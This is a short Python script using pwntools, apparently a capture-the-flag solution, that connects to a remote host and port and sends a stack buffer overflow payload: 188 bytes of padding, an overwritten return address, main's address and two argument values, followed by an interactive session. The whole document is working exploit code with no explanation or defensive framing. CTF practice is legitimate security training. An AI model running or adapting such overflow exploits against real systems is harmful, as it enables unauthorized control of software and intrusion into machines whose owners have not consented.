from pwn import *
r = remote("178.62.88.151", 30508)

pad = b'a'*188
ret = p32(0x080491e2)
main_addr = p32(0x080492b1)
a1 = p32(0xDEADBEEF)
a2 = p32(0xC0DED00D)
payload = pad + ret + main_addr + a1 + a2
print(payload)
r.sendline(payload)
r.interactive()